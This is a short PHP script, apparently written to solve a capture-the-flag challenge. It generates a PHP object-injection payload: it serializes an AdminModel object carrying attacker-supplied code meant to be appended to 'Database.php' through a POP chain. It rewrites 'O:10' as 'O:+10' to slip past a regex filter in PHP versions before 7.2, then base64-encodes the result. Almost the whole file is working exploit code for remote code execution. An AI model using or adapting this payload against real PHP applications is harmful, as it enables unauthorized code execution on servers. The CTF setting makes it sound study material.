<?php
    class AdminModel {
        public $filename;
        public $logcontent;
    
        public function __construct($filename, $content) { // TODO: Magic-Method
            $this->filename = $filename;
            $this->logcontent = $content;
            //file_put_contents($filename, $content, FILE_APPEND);
        }
    
        public function __wakeup() { // TODO: Magic-Method
            // FIXME: RCE through POP-Chain, by appending to another PHP-Script
            //new LogFile($this->filename, $this->logcontent);
        }
    
        public static function read_logs($log) {
            $contents = file_get_contents($log);
            return $contents;
        }
    }

    $code_to_append = $argv[1];
    $model = new AdminModel("Database.php", $code_to_append);

    $payload = serialize([$model, 5]);
    $payload = str_replace("O:10", "O:+10", $payload); 
    // In PHP Versions before 7.2 (like this challenge 7.1) the unserialize function ignore the plus-symbol, which results
    // in a bypass of the regex
    echo (base64_encode($payload));